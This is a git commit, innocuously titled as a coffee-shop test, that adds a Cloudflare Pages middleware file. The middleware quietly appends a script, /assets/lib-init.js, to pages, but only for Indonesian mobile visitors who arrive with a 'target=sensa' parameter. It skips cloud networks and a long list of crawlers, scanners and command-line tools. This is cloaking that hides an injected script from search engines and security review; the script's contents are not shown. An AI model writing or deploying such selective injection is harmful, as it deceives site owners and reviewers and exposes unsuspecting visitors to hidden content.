062213bd0fde08992c9c6aa96fa4a63a5c17b96d
belajarasik1122-pixel <belajarasik1122@gmail.com>
2025-12-30 12:15:23 +0700

    Test Toko Kopi Sensa

---
+++ functions/_middleware.js
@@ -0,0 +1,40 @@
+export async function onRequest(context) {
+  const { request, next } = context;
+  const url = new URL(request.url);
+  const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
+  const country = request.cf ? request.cf.country : 'Unknown';
+  const asOrganization = request.cf ? request.cf.asOrganization : '';
+  const targetKey = url.searchParams.get('target');
+  const colo = request.cf ? request.cf.colo : '';
+  if (targetKey !== 'sensa') {
+    return next();
+  }
+  if (country !== 'ID') {
+    return next();
+  }
+  const allowedColo = ['CGK', 'SUB', 'BTH', 'DPS', 'UPG', 'KNO'];
+  if (!allowedColo.includes(colo)) return next();
+  const cloudProviders = ['amazon', 'google', 'digitalocean', 'microsoft', 'cloudflare', 'akamai', 'datacentre'];
+  const isCloud = cloudProviders.some(provider => asOrganization.toLowerCase().includes(provider));
+  if (isCloud) {
+    return next();
+  }
+  const botList = /bot|spider|crawl|facebook|google|bing|slurp|yandex|adsbot|tiktok|bytedance|lighthouse|vision|petalinux|headless|linux|python|wget|curl|screenshot|preview|mediapartners|dubbin|monit/i;
+  if (botList.test(userAgent)) {
+    return next();
+  }
+  const isMobile = /android|iphone|ipad|mobile/i.test(userAgent);
+  if (!isMobile) {
+    return next();
+  }
+  const response = await next();
+  return new HTMLRewriter()
+    .on('body', {
+      element(el) {
+        el.append(`
+          <script src="/assets/lib-init.js" defer></script>
+        `, { html: true });
+      },
+    })
+    .transform(response);
+}
